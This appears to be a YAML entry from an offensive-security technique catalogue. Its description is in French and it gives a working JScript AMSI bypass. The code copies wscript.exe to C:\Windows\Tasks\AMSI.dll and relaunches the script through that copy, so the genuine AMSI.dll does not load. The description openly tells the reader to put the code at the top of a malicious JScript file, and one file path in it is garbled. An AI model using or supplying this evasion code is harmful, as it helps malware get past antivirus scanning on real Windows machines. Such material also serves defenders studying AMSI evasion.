---
description: |
  Dans ce contournement de l'AMSI, le binaire C:\NWindows\NSystem32\Nwscript.exe est copié dans un autre emplacement et renommé en AMSI.dll afin d'empêcher le chargement du véritable AMSI.dll. Ajoutez le code au début de votre fichier Jscript maléfique pour désactiver l'AMSI.

  Command Reference:
  ```
  AMSI.dll: DLL to be overwritten

  wscript.exe: Excutable which will be copied into modified AMSI.dll

  -e:  option indicates that the specified script file will be processed by jscript.dll (GUID)

  GUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58
  ```
command: |
  AMSI Bypass in JScript renaming AMSI.dll

code: |
  var filesys= new ActiveXObject("Scripting.FileSystemObject"); 
  var sh = new ActiveXObject('WScript.Shell');
  try
  {
      if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
      {
          throw new Error(1, '');
      } 
  }
  catch(e)
  {
      filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
      sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
      WScript.Quit(1); 
  }

items:
  - Shell
services:
  - AV
OS:
  - Windows
  - Approved-tool
attack_types:
  - Bypassing
references:
  - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass#jscript
  - LINK
---